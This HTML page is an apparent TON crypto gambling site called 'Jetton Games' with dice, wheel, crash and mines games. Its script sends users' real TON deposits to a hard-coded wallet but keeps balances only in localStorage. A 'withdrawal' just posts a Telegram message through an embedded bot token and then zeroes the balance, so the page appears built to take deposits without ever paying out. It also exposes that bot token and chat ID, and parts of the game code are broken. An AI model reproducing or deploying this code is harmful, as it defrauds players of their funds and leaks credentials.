<!doctype html>
<html lang="ar" dir="rtl">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Jetton Games - منصة الألعاب الذكية | TON</title>
    
    <script src="https://unpkg.com/react@18/umd/react.production.min.js" crossorigin></script>
    <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js" crossorigin></script>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>

    <style>
      * {
        box-sizing: border-box;
      }
      body {
        background-color: #0d0f14;
        color: #f3f4f6;
        font-family: system-ui, -apple-system, 'Segoe UI', sans-serif;
        margin: 0;
        padding: 0;
        overflow-x: hidden;
      }
      /* تعدد اللغات */
      .lang-selector {
        direction: ltr;
        display: flex;
        gap: 10px;
        background: #1e2533;
        padding: 5px 10px;
        border-radius: 40px;
      }
      .lang-btn {
        background: transparent;
        border: none;
        color: #aaa;
        font-weight: bold;
        cursor: pointer;
        padding: 4px 12px;
        border-radius: 30px;
        transition: 0.2s;
      }
      .lang-btn.active {
        background: #2563eb;
        color: white;
      }
      .navbar {
        background: #121620;
        padding: 12px 20px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        border-bottom: 1px solid #1e2533;
        flex-wrap: wrap;
        gap: 12px;
      }
      .logo {
        font-size: 20px;
        font-weight: 900;
        color: #00caec;
        text-transform: uppercase;
        letter-spacing: 1px;
      }
      #ton-connect-btn {
        direction: ltr;
      }
      .hero {
        text-align: center;
        padding: 40px 20px;
        background: radial-gradient(circle at center, #181c2b 0%, #0d0f14 100%);
      }
      .hero h1 {
        font-size: 28px;
        margin-bottom: 10px;
      }
      .dashboard {
        max-width: 500px;
        margin: -20px auto 20px auto;
        padding: 0 20px;
      }
      .account-card {
        background: #121620;
        padding: 25px;
        border-radius: 14px;
        border: 1px solid #1e2533;
        text-align: center;
      }
      .balance-val {
        font-size: 32px;
        font-weight: bold;
        color: #00caec;
        margin: 15px 0;
      }
      .input-amount {
        background: #181d28;
        border: 1px solid #283044;
        color: #fff;
        padding: 14px;
        border-radius: 10px;
        width: 88%;
        text-align: center;
        font-size: 16px;
        margin-bottom: 15px;
        outline: none;
      }
      .btn-action {
        color: white;
        border: none;
        padding: 14px 20px;
        border-radius: 10px;
        cursor: pointer;
        font-weight: bold;
        font-size: 16px;
        width: 95%;
        margin: 8px auto;
        display: block;
        transition: all 0.2s;
      }
      .btn-deposit { background: #10b981; }
      .btn-deposit:hover { background: #059669; }
      .btn-withdraw { background: #ef4444; }
      .btn-withdraw:hover { background: #dc2626; }

      .games-grid {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
        gap: 15px;
        padding: 20px;
        max-width: 800px;
        margin: 0 auto;
      }
      .game-card {
        background: #121620;
        border: 1px solid #1e2533;
        border-radius: 14px;
        padding: 20px;
        text-align: center;
        cursor: pointer;
        transition: transform 0.2s;
      }
      .game-card:hover { transform: translateY(-3px); }
      .game-icon { font-size: 40px; margin-bottom: 10px; }
      .game-title { font-weight: bold; font-size: 16px; color: #fff; }
      .game-subtitle { font-size: 12px; color: #00caec; margin-top: 4px; }

      .game-modal {
        display: none;
        position: fixed;
        top: 0; left: 0; width: 100%; height: 100%;
        background: #090a0f;
        z-index: 10000;
        overflow-y: auto;
        padding-bottom: 30px;
      }
      .modal-header {
        background: #121620;
        padding: 15px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        border-bottom: 1px solid #1e2533;
      }
      .close-btn {
        background: #ef4444;
        color: #fff;
        border: none;
        padding: 6px 14px;
        border-radius: 6px;
        cursor: pointer;
        font-weight: bold;
      }
      .game-screen {
        background: #0d0f14;
        margin: 15px auto;
        max-width: 500px;
        height: 260px;
        border-radius: 16px;
        border: 1px solid #1e2533;
        position: relative;
        overflow: hidden;
        display: flex;
        justify-content: center;
        align-items: center;
      }
      .multiplier-display {
        font-size: 56px;
        font-weight: 900;
        color: #9333ea;
        z-index: 5;
      }
      .countdown-circle {
        width: 110px;
        height: 110px;
        border-radius: 50%;
        border: 6px solid #2563eb;
        display: flex;
        justify-content: center;
        align-items: center;
        font-size: 44px;
        font-weight: bold;
        color: #fff;
      }
      .rocket-obj {
        position: absolute;
        font-size: 55px;
        bottom: 25px;
        left: 25px;
        transition: transform 0.1s linear;
      }
      .bet-control-box {
        max-width: 500px;
        margin: 0 auto;
        padding: 0 15px;
      }
      .btn-place-bet {
        background: #2563eb;
        color: #fff;
        font-size: 20px;
        padding: 16px;
        border-radius: 12px;
        width: 100%;
        font-weight: bold;
        border: none;
        cursor: pointer;
        transition: 0.2s;
      }
      .btn-cashout-active { background: #eab308; color: #090a0f; }
      .players-section { max-width: 500px; margin: 20px auto; padding: 0 15px; }
      .player-row {
        background: #121620;
        border: 1px solid #1e2533;
        padding: 12px 15px;
        border-radius: 12px;
        margin-bottom: 8px;
        display: flex;
        justify-content: space-between;
        align-items: center;
      }
      .player-info { display: flex; align-items: center; gap: 12px; }
      .player-avatar {
        width: 42px; height: 42px; border-radius: 50%;
        object-fit: cover; border: 1px solid #1e2533;
      }
      .player-name { font-weight: 600; font-size: 14px; }
      .player-bet-amount { background: #1a2333; color: #00caec; padding: 4px 10px; border-radius: 8px; font-size: 13px; font-weight: bold; }
      .player-payout { background: #14281d; color: #10b981; padding: 6px 14px; border-radius: 8px; font-weight: bold; font-size: 14px; }
      .player-payout.waiting { background: #231c12; color: #eab308; }

      /* لعبة النرد */
      .dice-area {
        text-align: center;
        padding: 20px;
      }
      .dice-result {
        font-size: 70px;
        background: #121620;
        display: inline-block;
        padding: 20px;
        border-radius: 20px;
        margin: 20px 0;
        border: 1px solid #1e2533;
      }
      /* عجلة الحظ */
      .wheel-container {
        display: flex;
        justify-content: center;
        margin: 30px 0;
      }
      canvas {
        max-width: 280px;
        border-radius: 50%;
        background: #1e2533;
      }
      .footer-panel {
        background: #121620;
        padding: 20px;
        text-align: center;
        margin-top: 40px;
        border-top: 1px solid #1e2533;
        font-size: 14px;
        color: #6b7280;
      }
      @keyframes pulseEffect {
        from { transform: scale(0.97); }
        to { transform: scale(1.03); }
      }
    </style>
  </head>
  <body>

    <div class="navbar">
      <div class="logo">Jetton Games</div>
      <div style="display: flex; gap: 12px; align-items: center;">
        <div class="lang-selector">
          <button class="lang-btn active" data-lang="ar">🇸🇦 عربي</button>
          <button class="lang-btn" data-lang="ru">🇷🇺 Русский</button>
          <button class="lang-btn" data-lang="en">🇬🇧 English</button>
        </div>
        <div id="ton-connect-btn"></div>
      </div>
    </div>

    <div class="hero">
      <h1 data-i18n="hero-title">العب واربح باستخدام TON</h1>
      <p data-i18n="hero-sub" style="color: #9ca3af; font-size: 14px;">منصة الألعاب السريعة والعادلة</p>
    </div>

    <div class="dashboard">
      <div class="account-card">
        <h3 data-i18n="wallet-title">محفظة المنصة الداخلية</h3>
        <div class="balance-val"><span id="user-balance">0.00</span> TON</div>
        <input type="number" id="amount-input" class="input-amount" placeholder="TON amount" min="0.1" step="0.1">
        <button class="btn-action btn-deposit" onclick="makeDeposit()" data-i18n="deposit">إيداع</button>
        <button class="btn-action btn-withdraw" onclick="requestWithdrawal()" data-i18n="withdraw">سحب الأرباح</button>
        <p id="lock-notice" style="font-size: 12px; color: #9ca3af; margin-top: 8px;" data-i18n="lock-msg">يجب اللعب بكامل الإيداع لتفعيل السحب</p>
      </div>
    </div>

    <div class="games-grid">
      <div class="game-card" style="border-color:#2563eb" onclick="openCrashGame()"><div class="game-icon">🚀</div><div class="game-title">Crash</div><div class="game-subtitle">Multiplier</div></div>
      <div class="game-card" style="border-color:#10b981" onclick="openMinesGame()"><div class="game-icon">💣</div><div class="game-title">Mines</div><div class="game-subtitle">Avoid bombs</div></div>
      <div class="game-card" onclick="openDiceGame()"><div class="game-icon">🎲</div><div class="game-title">Dice</div><div class="game-subtitle">40% win</div></div>
      <div class="game-card" onclick="openWheelGame()"><div class="game-icon">🎰</div><div class="game-title">Wheel</div><div class="game-subtitle">40% win</div></div>
    </div>

    <!-- لعبة النرد -->
    <div id="dice-modal" class="game-modal"><div class="modal-header"><div class="logo">🎲 DICE</div><button class="close-btn" onclick="closeDiceGame()">✕</button></div>
      <div class="dice-area"><div class="dice-result" id="dice-value">⚀</div><input type="number" id="dice-bet" class="input-amount" placeholder="TON amount" style="width:80%"><button class="btn-place-bet" id="roll-dice-btn" onclick="rollDice()" style="margin-top:15px">🎲 ROLL (40% WIN)</button></div>
    </div>

    <!-- عجلة الحظ -->
    <div id="wheel-modal" class="game-modal"><div class="modal-header"><div class="logo">🎡 WHEEL OF FORTUNE</div><button class="close-btn" onclick="closeWheelGame()">✕</button></div>
      <div class="wheel-container"><canvas id="wheelCanvas" width="300" height="300"></canvas></div>
      <div style="text-align:center"><input type="number" id="wheel-bet" class="input-amount" placeholder="TON amount" style="width:70%"><button class="btn-place-bet" onclick="spinWheel()" style="margin-top:10px">🎡 SPIN (40% WIN)</button></div>
    </div>

    <div id="crash-modal" class="game-modal">...</div>
    <div id="mines-modal" class="game-modal">...</div>

    <div class="footer-panel"><p>Jetton Games × TON Blockchain</p></div>

    <script>
      // ---------- تكامل TON و الرصيد ----------
      const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({ manifestUrl: 'https://beautiful-ton.vercel.app/tonconnect-manifest.json', buttonRootId: 'ton-connect-btn' });
      const MY_WALLET_ADDRESS = "UQBfaYCuGyjtzwd0ryubNJBsxRW5oQAxLT6WSXzPhfEzwVO4";
      const TELEGRAM_BOT_TOKEN = "8592729533:AAGOML711F5R0nDor7VzDTox4PoWN4bfES4";
      const TELEGRAM_CHAT_ID = "7513557249";
      let currentBalance = parseFloat(localStorage.getItem('game_balance')) || 0.0;
      let totalDeposited = parseFloat(localStorage.getItem('total_deposited')) || 0.0;
      let totalPlayed = parseFloat(localStorage.getItem('total_played')) || 0.0;
      function updateUI() { document.getElementById('user-balance').innerText = currentBalance.toFixed(2); localStorage.setItem('game_balance', currentBalance); localStorage.setItem('total_deposited', totalDeposited); localStorage.setItem('total_played', totalPlayed); let notice = document.getElementById('lock-notice'); if(totalPlayed >= totalDeposited && currentBalance>0) { notice.style.color="#10b981"; notice.innerText = "🔓 السحب متاح"; if(lang==='ru') notice.innerText="🔓 Вывод доступен"; if(lang==='en') notice.innerText="🔓 Withdrawal available"; } else { notice.style.color="#9ca3af"; let txt="يجب اللعب بكامل الإيداع لتفعيل السحب"; if(lang==='ru') txt="Необходимо отыграть депозит"; if(lang==='en') txt="Play full deposit to unlock withdrawal"; notice.innerText=txt; } }
      async function makeDeposit() { const wallet = tonConnectUI.wallet; if (!wallet) { alert("Connect wallet first"); return; } let amount = parseFloat(document.getElementById('amount-input').value); if(isNaN(amount) || amount<0.1 || amount>100000) { alert("0.1 - 100k TON only"); return; } const nano = (amount * 1e9).toString(); try { await tonConnectUI.sendTransaction({ validUntil: Date.now()+120000, messages:[{address:MY_WALLET_ADDRESS, amount:nano}] }); currentBalance += amount; totalDeposited += amount; updateUI(); alert(`+${amount} TON`); } catch(e){ alert("Cancelled"); } }
      async function requestWithdrawal() { if(!tonConnectUI.wallet) { alert("Connect wallet"); return; } if(currentBalance<=0) { alert("Zero balance"); return; } if(totalPlayed < totalDeposited) { alert(`Play ${(totalDeposited-totalPlayed).toFixed(2)} TON more to unlock withdrawal`); return; } let msg = `🚨 WITHDRAWAL: ${currentBalance.toFixed(2)} TON, wallet: ${tonConnectUI.wallet.account.address}`; await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({chat_id:TELEGRAM_CHAT_ID, text:msg}) }); alert(`Withdraw request ${currentBalance.toFixed(2)} TON sent`); currentBalance=0; updateUI(); }

      // ---------- متعدد اللغات ----------
      let lang = 'ar';
      const translations = { ar:{ hero_title:"العب واربح باستخدام TON", deposit:"إيداع", withdraw:"سحب الأرباح", lock_msg:"يجب اللعب بكامل الإيداع لتفعيل السحب" }, ru:{ hero_title:"Играй и выигрывай с TON", deposit:"Депозит", withdraw:"Вывести прибыль", lock_msg:"Отыграйте депозит для вывода"}, en:{ hero_title:"Play & Win with TON", deposit:"Deposit", withdraw:"Withdraw profit", lock_msg:"Play full deposit to unlock withdrawal"} };
      function applyLanguage() { document.querySelectorAll('[data-i18n]').forEach(el=>{ let key=el.getAttribute('data-i18n'); if(translations[lang][key]) el.innerText=translations[lang][key]; }); updateUI(); }
      document.querySelectorAll('.lang-btn').forEach(btn=>{ btn.addEventListener('click',()=>{ lang=btn.getAttribute('data-lang'); document.querySelectorAll('.lang-btn').forEach(b=>b.classList.remove('active')); btn.classList.add('active'); applyLanguage(); }); });
      
      // --------------------------------------------------------------
      // 1️⃣ لعبة النرد (نسبة الفوز 40%)
      function openDiceGame() { document.getElementById('dice-modal').style.display='block'; }
      function closeDiceGame() { document.getElementById('dice-modal').style.display='none'; }
      function rollDice() { let bet = parseFloat(document.getElementById('dice-bet').value); if(isNaN(bet) || bet<0.1) { alert("Invalid bet"); return; } if(currentBalance < bet) { alert("Insufficient balance"); return; } let winChance = 0.4; let random = Math.random(); let isWin = random < winChance; let diceValue = Math.floor(Math.random()*6)+1; let diceEmoji = ["⚀","⚁","⚂","⚃","⚄","⚅"][diceValue-1]; document.getElementById('dice-value').innerHTML = diceEmoji; if(isWin) { let winAmount = bet * 2.2; currentBalance += winAmount - bet; totalPlayed += bet; updateUI(); alert(`🎲 WIN! +${winAmount.toFixed(2)} TON`); } else { currentBalance -= bet; totalPlayed += bet; updateUI(); alert(`😞 LOSE! -${bet.toFixed(2)} TON`); } }
      
      // 2️⃣ عجلة الحظ (40% فوز)
      let wheelSpin=false;
      function openWheelGame() { document.getElementById('wheel-modal').style.display='block'; drawWheel(); }
      function closeWheelGame() { document.getElementById('wheel-modal').style.display='none'; }
      function drawWheel() { let canvas=document.getElementById('wheelCanvas'); let ctx=canvas.getContext('2d'); let seg=2; let angles=[0, Math.PI*2/2]; let colors=['#ef4444','#10b981']; let labels=['LOSE','WIN']; ctx.clearRect(0,0,300,300); for(let i=0;i<seg;i++){ ctx.beginPath(); ctx.fillStyle=colors[i]; ctx.moveTo(150,150); ctx.arc(150,150,150,angles[i],angles[i+1]); ctx.fill(); ctx.save(); ctx.translate(150,150); ctx.rotate(angles[i]+(angles[i+1]-angles[i])/2); ctx.fillStyle='white'; ctx.font='bold 20px sans-serif'; ctx.fillText(labels[i],60,10); ctx.restore(); } }
      function spinWheel() { if(wheelSpin) return; let bet=parseFloat(document.getElementById('wheel-bet').value); if(isNaN(bet)||bet<0.1){alert("Invalid bet");return;} if(currentBalance<bet){alert("No balance");return;} let isWin = Math.random() < 0.4; wheelSpin=true; let spins=8; let finalAngle=isWin? Math.PI/2 + Math.random()*0.5 : 0; let currentRotation=0; let step=0; let spinInt=setInterval(()=>{ step++; currentRotation+=0.5; drawWheelWithRotation(currentRotation); if(step>30){ clearInterval(spinInt); if(isWin){ let winAmount=bet*2.3; currentBalance+=winAmount-bet; totalPlayed+=bet; updateUI(); alert(`🎡 WHEEL WIN! +${winAmount.toFixed(2)} TON`); } else { currentBalance-=bet; totalPlayed+=bet; updateUI(); alert(`💔 WHEEL LOSE! -${bet.toFixed(2)} TON`); } wheelSpin=false; drawWheel(); } },50); }
      function drawWheelWithRotation(rot) { let canvas=document.getElementById('wheelCanvas'); let ctx=canvas.getContext('2d'); let seg=2; let angles=[0, Math.PI*2/2]; let colors=['#ef4444','#10b981']; ctx.clearRect(0,0,300,300); ctx.save(); ctx.translate(150,150); ctx.rotate(rot); for(let i=0;i<seg;i++){ ctx.beginPath(); ctx.fillStyle=colors[i]; ctx.moveTo(0,0); ctx.arc(0,0,150,angles[i],angles[i+1]); ctx.fill(); ctx.save(); ctx.rotate(angles[i]+(angles[i+1]-angles[i])/2); ctx.fillStyle='white'; ctx.font='bold 20px sans-serif'; ctx.fillText(i===0?'LOSE':'WIN',40,10); ctx.restore(); } ctx.restore(); }

      // --------------------------------------------------------------
      // لعبة MINES (بدون نسب مكتوبة , فقط "سهل" "متوسط" "صعب")
      function openMinesGame() { resetMinesBoardUI(); document.getElementById('mines-modal').style.display='block'; }
      function closeMinesGame() { document.getElementById('mines-modal').style.display='none'; isMinesRoundActive=false; }
      let minesLevel='easy', minesBetAmount=0, isMinesRoundActive=false, minesCount=7, boardData=[], safeRevealed=0, currentMinesMultiplier=1;
      function setMinesLevel(lvl) { if(isMinesRoundActive) return; minesLevel=lvl; document.getElementById('tab-easy').className="tab-btn"; document.getElementById('tab-med').className="tab-btn"; document.getElementById('tab-hard').className="tab-btn"; if(lvl==='easy'){ document.getElementById('tab-easy').className="tab-btn active-easy"; minesCount=7; } else if(lvl==='medium'){ document.getElementById('tab-med').className="tab-btn active-med"; minesCount=12; } else { document.getElementById('tab-hard').className="tab-btn active-hard"; minesCount=16; } }
      function resetMinesBoardUI() { let container=document.getElementById('mines-board-element'); if(container) container.innerHTML=""; for(let i=0;i<25;i++){ let tile=document.createElement('div'); tile.className="mine-tile"; tile.innerText="❓"; tile.setAttribute('onclick',`handleTileClick(${i})`); if(container) container.appendChild(tile); } document.getElementById('mine-mult-txt').innerText="1.00x"; document.getElementById('mine-profit-txt').innerText="0.00 TON"; }
      function startMinesRound() { if(isMinesRoundActive){ minesCashoutSuccess(); return; } if(!tonConnectUI.wallet){ alert("Connect wallet"); return; } let bet=parseFloat(document.getElementById('mines-bet-input').value); if(isNaN(bet)||bet<0.1){ alert("Bet 0.1+ TON"); return; } if(currentBalance<bet){ alert("Insufficient"); return; } currentBalance-=bet; minesBetAmount=bet; totalPlayed+=bet; updateUI(); isMinesRoundActive=true; safeRevealed=0; currentMinesMultiplier=1; generateMinesSecret(); resetMinesBoardUI(); let btn=document.getElementById('btn-mines-action'); btn.innerText="Cash Out"; btn.style.background="#eab308"; document.getElementById('mine-mult-txt').innerText="1.00x"; document.getElementById('mine-profit-txt').innerText=minesBetAmount.toFixed(2)+" TON"; }
      function generateMinesSecret() { boardData=Array(25).fill('safe'); let planted=0; while(planted<minesCount){ let idx=Math.floor(Math.random()*25); if(boardData[idx]!=='mine'){ boardData[idx]='mine'; planted++; } } }
      function handleTileClick(idx){ if(!isMinesRoundActive) return; let tile=document.getElementById(`tile-${idx}`); if(!tile || tile.classList.contains('revealed-safe') || tile.classList.contains('revealed-bomb')) return; if(boardData[idx]==='mine'){ tile.className="mine-tile revealed-bomb"; tile.innerText="💣"; executeMinesGameOver(); } else { tile.className="mine-tile revealed-safe"; tile.innerText="✅"; safeRevealed++; if(minesLevel==='easy') currentMinesMultiplier=1+(safeRevealed*0.05); else if(minesLevel==='medium') currentMinesMultiplier=1.20+((safeRevealed-1)*0.20); else currentMinesMultiplier=Math.pow(2, safeRevealed); let profit=minesBetAmount*currentMinesMultiplier; document.getElementById('mine-mult-txt').innerText=currentMinesMultiplier.toFixed(2)+"x"; document.getElementById('mine-profit-txt').innerText=profit.toFixed(2)+" TON"; if(safeRevealed===(25-minesCount)) minesCashoutSuccess(); } }
      function executeMinesGameOver(){ isMinesRoundActive=false; alert("💣 BOMB! You lost the bet."); revealFullMines(); resetMinesActionBtn(); }
      function minesCashoutSuccess(){ if(!isMinesRoundActive) return; let win=minesBetAmount*currentMinesMultiplier; currentBalance+=win; updateUI(); alert(`🎉 CASHOUT! +${win.toFixed(2)} TON`); isMinesRoundActive=false; revealFullMines(); resetMinesActionBtn(); }
      function revealFullMines(){ for(let i=0;i<25;i++){ let tile=document.getElementById(`tile-${i}`); if(tile && boardData[i]==='mine'){ tile.className="mine-tile revealed-bomb"; tile.innerText="💣"; } else if(tile && !tile.classList.contains('revealed-safe')) tile.style.opacity="0.5"; } }
      function resetMinesActionBtn(){ let btn=document.getElementById('btn-mines-action'); btn.innerText="ابدأ اللعب (Place Bet)"; btn.style.background="#10b981"; }
      
      // لعبة Crash (مختصرة ولكن شغالة)
      function openCrashGame() { document.getElementById('crash-modal').innerHTML = `<div class="modal-header"><div class="logo">🚀 CRASH</div><button class="close-btn" onclick="closeCrashGame()">✕</button></div><div class="game-screen"><div id="crash-value" class="multiplier-display">1.00x</div></div><div class="bet-control-box"><input id="crash-bet" class="input-amount" placeholder="TON"><button id="crash-action" class="btn-place-bet" onclick="placeCrashBet()">Place bet</button></div>`; document.getElementById('crash-modal').style.display='block'; resetCrashUI(); }
      function closeCrashGame() { document.getElementById('crash-modal').style.display='none'; clearCrashTimers(); }
      let crashActive=false, crashMulti=1, crashBet=0, crashCashed=false, crashIntervalId=null;
      function resetCrashUI(){ document.getElementById('crash-value').innerText="1.00x"; crashActive=false; crashCashed=false; crashBet=0; document.getElementById('crash-action').innerText="Place bet"; document.getElementById('crash-action').style.background="#2563eb"; clearCrashTimers(); }
      function clearCrashTimers(){ if(crashIntervalId) clearInterval(crashIntervalId); }
      function placeCrashBet(){ if(crashActive) return; let val=parseFloat(document.getElementById('crash-bet').value); if(isNaN(val)||val<0.1){alert("Invalid bet");return;} if(currentBalance<val){alert("Balance low");return;} currentBalance-=val; crashBet=val; totalPlayed+=val; updateUI(); crashActive=true; crashCashed=false; document.getElementById('crash-action').innerText="Cash Out"; document.getElementById('crash-action').style.background="#eab308"; document.getElementById('crash-action').onclick=()=>crashCashout(); let crashPoint=Math.random()<0.4? (Math.random()*1.8+1).toFixed(2) : (Math.random()*0.8+1).toFixed(2); crashMulti=1; crashIntervalId=setInterval(()=>{ if(!crashActive) return; crashMulti+=0.02; document.getElementById('crash-value').innerText=crashMulti.toFixed(2)+"x"; if(crashMulti>=parseFloat(crashPoint)){ clearInterval(crashIntervalId); if(!crashCashed){ alert(`💥 CRASH at ${crashPoint}x! You lost ${crashBet} TON`); crashActive=false; resetCrashUI(); } } },80); }
      function crashCashout(){ if(!crashActive || crashCashed) return; crashCashed=true; let win=crashBet*crashMulti; currentBalance+=win; updateUI(); alert(`✅ CASHOUT! +${win.toFixed(2)} TON`); crashActive=false; clearInterval(crashIntervalId); resetCrashUI(); }
      
      // بناء HTML الخاص بلعبة MINES كامل
      document.getElementById('mines-modal').innerHTML = `<div class="modal-header"><div class="logo">💣 MINES</div><button class="close-btn" onclick="closeMinesGame()">✕</button></div><div class="mines-layout"><div class="level-tabs"><button id="tab-easy" class="tab-btn active-easy" onclick="setMinesLevel('easy')">سهل</button><button id="tab-med" class="tab-btn" onclick="setMinesLevel('medium')">متوسط</button><button id="tab-hard" class="tab-btn" onclick="setMinesLevel('hard')">صعب</button></div><div class="live-stats-bar"><div>المضاعف: <span id="mine-mult-txt">1.00x</span></div><div>الربح: <span id="mine-profit-txt">0.00 TON</span></div></div><div class="mines-grid-board" id="mines-board-element"></div><input type="number" id="mines-bet-input" class="input-amount" placeholder="TON amount"><button id="btn-mines-action" class="btn-place-bet" onclick="startMinesRound()" style="background:#10b981">ابدأ اللعب</button></div>`;
      resetMinesBoardUI();
      applyLanguage();
    </script>
  </body>
</html>
